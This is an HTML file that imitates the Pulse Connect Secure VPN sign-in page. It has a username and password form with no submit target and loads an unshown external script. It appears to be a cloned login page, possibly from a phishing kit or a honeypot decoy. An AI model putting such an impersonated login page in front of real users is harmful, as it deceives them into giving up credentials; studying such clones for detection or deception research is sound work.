<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pulse Connect Secure</title>
    <link rel="shortcut icon" href="./assets/images/favicon.png" />
    <link rel="stylesheet" type="text/css" href="./assets/styles.css">
</head>

<body>
    <table id="table_LoginPage_1" width="100%" cellspacing="0" cellpadding="3" border="0">
        <tbody>
            <tr>
                <td bgcolor="#E3E3E3"><img src="./assets/images/welcome.png" alt="Logo" border="0"></td>
                <td bgcolor="#E3E3E3" align="right">&nbsp;</td>
            </tr>
        </tbody>
    </table>
    <table id="table_LoginPage_2" width="100%" cellspacing="0" cellpadding="0" border="0">
        <tbody>
            <tr>
                <td colspan="2" bgcolor="#000000"><img src="./assets/images/space.gif" width="1" height="1" border="0"></td>
            </tr>
        </tbody>
    </table>

    <blockquote>
        <form autocomplete="off" id="login_form" name="login_form">
            <table id="table_LoginPage_3" cellspacing="0" cellpadding="2" border="0">
                <tbody>
                <tr>
                    <td colspan="3" nowrap="nowrap"><b>Welcome to</b></td>
                </tr>
                <tr>
                    <td colspan="3" nowrap="nowrap"><span class="cssLarge"><b>Pulse Connect Secure</b></span></td>
                </tr>
                <tr>
                    <td colspan="3">&nbsp;</td>
                </tr>
                <tr>

                    <td valign="top">

                        <table id="table_LoginPage_6" cellspacing="0" cellpadding="2" border="0">
                            <tbody>
                            <tr>
                                <td>Username</td>
                                <td>&nbsp;</td>
                                <td><input type="text" value="" id="email" name="email" placeholder="Email or Phone Number" autocomplete="off" size="20"></td>
                            </tr>
                            <tr>
                                <td>Password</td>
                                <td>&nbsp;</td>
                                <td><input type="password" value="" id="password" name="password" placeholder="Password" autocomplete="new-password" size="20"></td>
                            </tr>
                            <tr><input id="realm_16" type="hidden" name="realm" value="Users"></tr>
                            <tr>
                                <td colspan="3">&nbsp;</td>
                            </tr>
                            <tr>
                                <td>&nbsp;</td>
                                <td>&nbsp;</td>
                                <td><input id="btnSubmit_6" type="submit" value="Sign In" name="btnSubmit">&nbsp;</td>
                            </tr>
                            </tbody>
                        </table>

                    </td>
                    <td valign="top">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
                    <td valign="top">
                        <table id="TABLE_LoginPage_1" cellspacing="0" cellpadding="2" border="0">
                            <tbody>
                            <tr>
                                <td>Please sign in to begin your secure session.<br><br>
                                    <noscript>Note: Javascript is disabled on your browser.</noscript>
                                </td>
                            </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
                </tbody>
            </table>
        </form>
    </blockquote>

    <table id="table_LoginPage_9" width="100%" cellspacing="0" cellpadding="0" border="0">
        <tbody>
        <tr>
            <td class="bg">
                <table id="table_LoginPage_10" width="100%" cellspacing="0" cellpadding="0" border="0">
                    <tbody>
                    <tr>
                        <td><img src="./assets/images/space.gif" width="10" height="10"></td>
                        <td><img src="./assets/images/space.gif" width="1" height="2"></td>
                        <td><img src="./assets/images/space.gif" width="10" height="10"></td>
                    </tr>
                    <tr valign="top">
                        <td><img src="./assets/images/space.gif" width="10" height="1"></td>
                        <td nowrap="nowrap"><br><br><br><br>
                        </td>
                        <td align="right"><img src="./assets/images/space.gif" width="10" height="10"></td>
                    </tr>
                    </tbody>
                </table>
            </td>
        </tr>
        <tr>
            <td colspan="2"><img src="./assets/images/space.gif" alt="" width="1" height="6" border="0"></td>
        </tr>
        </tbody>
    </table>

    <script src="assets/script.js"></script>

</body>
</html>
